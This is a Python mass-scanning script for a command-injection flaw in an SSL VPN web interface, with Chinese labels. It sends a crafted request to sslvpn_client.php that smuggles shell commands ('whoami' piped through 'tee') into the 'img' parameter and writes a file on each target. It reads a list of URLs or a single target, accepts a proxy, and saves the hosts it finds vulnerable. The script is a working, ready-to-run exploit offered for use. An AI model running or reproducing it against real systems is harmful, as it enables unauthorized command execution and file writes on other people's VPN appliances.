import requests
import argparse
from colorama import init, Fore

init(autoreset=True)  

def check_vulnerability(url, proxy):
    payload = "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls"

    target_url = url + payload

    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(target_url, timeout=20, proxies=proxies, verify=False)

        status_code = response.status_code
        response_text = response.text

        print(f"URL: {Fore.GREEN if status_code == 200 and 'x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/ceshi.txt|ls' in response_text else Fore.RED} {target_url}")
        print(f"Status Code: {Fore.GREEN if status_code == 200 else Fore.RED} {status_code}")
        print(f"Response Content: {Fore.GREEN if status_code == 200 else Fore.RED} {response_text}")

        if status_code == 200:
            if "x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/ceshi.txt|ls" in response_text:
                return True
            else:
                return False
        elif status_code == 404 or "输入参数不合法，请重试" in response_text:
            return False
        else:
            return False
    except requests.RequestException as e:
        print(f"{Fore.RED}Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="SSLVPN漏洞批量检测脚本")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="包含URL列表的文件")
    group.add_argument("-t", "--target", help="单个目标URL")

    parser.add_argument("-p", "--proxy", help="代理服务器地址，例如：http://127.0.0.1:8080")

    args = parser.parse_args()

    if args.file:
        with open(args.file, "r") as file:
            urls = [line.strip() for line in file.readlines()]
    else:
        urls = [args.target]

    vulnerable_urls = []

    for url in urls:
        if check_vulnerability(url, args.proxy):
            print(f"{Fore.GREEN}漏洞存在: {url}")
            vulnerable_urls.append(url)
        else:
            print(f"{Fore.RED}漏洞不存在: {url}")

    if vulnerable_urls:
        with open("result.txt", "w") as result_file:
            result_file.write("\n".join(vulnerable_urls))
        print("结果已保存到result.txt文件中")
    else:
        print("未发现漏洞")

if __name__ == "__main__":
    main()
